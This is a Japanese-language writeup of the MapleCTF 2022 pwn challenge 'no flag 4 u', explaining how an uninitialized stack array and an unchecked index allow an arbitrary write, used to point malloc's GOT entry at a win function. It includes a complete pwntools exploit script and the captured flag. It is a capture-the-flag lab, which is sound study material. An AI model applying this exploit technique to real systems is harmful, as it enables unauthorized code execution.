# MapleCTF 2022 `no flag 4 u [pwn]` writeup

## 問題
I made a thing: https://github.com/Green-Avocado/No-Flag-4-U

Please break it and let me know how you did it!

`nc no-flag-4-u.ctf.maplebacon.org 1337`

実行ファイルとlibc、それから実行用のシェルスクリプトが提供される。

## 解法
セキュリティ機構の確認から。
```
[*] '/home/caffeine/ctf/maplectf22/pwn/no_flag_4_u/chal'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

まさかの逆フルアーマー。
何でもありか。

プログラム自体はheap問でよく見るメモを作成、書き換え、閲覧、削除できるやつ。
BOF、double freeやuse after freeなど何でもやりたい放題 (に見える) なうえに、メモを管理する配列の範囲チェックすらしていない。
win関数も用意されている。

代わりにlibcはいくつかの関数をwrapperした独自のものを使用しているらしく、BOFが検知されたりUTF-8で定義されていないバイト列の入出力が禁止されていたりする。

穴だらけに見えて独自の制約がいろいろありそうなのでgdbで動的解析しながら解法を考えることに。
するとスタックに確保されたメモ管理用配列がNULLで初期化されていないことにすぐ気づけた。
配列の中には、スタック領域のアドレスを保持しているものもある。
Format string attackでよく見る手法だが、スタック上のアドレス*X*にスタックの上のアドレス*Y*が格納されている場合には、以下の手順で任意のアドレス*Z*に任意の値*hoge*を書き込むことができる。

1. アドレス*X*を参照して*Z*を書き込む。
2. アドレス*Y*を参照して*hoge*を書き込む。

今回、*Y*にあたるアドレスは配列の範囲外にあったが、前述の通り配列のインデックスを妥当性確認をしていないため強引に参照することができる。

あとはどのアドレスをwin()のアドレスに書き換えるか。
まぁNo RELROなのでGOTを狙いましょう。
前述の入出力制限が少し面倒に見えたが、malloc()のGOT上のアドレスが都合がよかった。

## Exploit
```py
from pwn import *
import sys

context.arch='i386'

# io = process("./chal")
# io = process("./run.sh")
io = remote("no-flag-4-u.ctf.maplebacon.org", 1337)

elf = ELF("chal")
libc = ELF("libno_flag_4_u.so")

# gdb.attach(io, '''
#     b *0x4014fe
# ''')

def select(x):
    io.sendlineafter(b"5 : Exit\n", str(x).encode())

def index(x):
    io.sendlineafter(b"index: ", str(x).encode())

def content(x):
    io.sendlineafter(b"content: ", x)

def size(x):
    io.sendlineafter(b"size: ", str(x).encode())

def create(i, s, c):
    select(1)
    index(i)
    size(s)
    content(c)

def edit(i, c):
    select(2)
    index(i)
    content(c)

def print(i):
    select(3)
    index(i)
    ret = io.recvuntil(b"1 :")
    return ret[:-3]

def delete(i):
    select(4)
    index(i)

def exit():
    select(5)

edit(16, b'\x10\x35\x40')
edit(0x60, b'\x38\x13\x40')
select(1)
index(0)
size(0x10)

io.interactive()
```

FLAG: `maple{OwO_flag_for_you?}`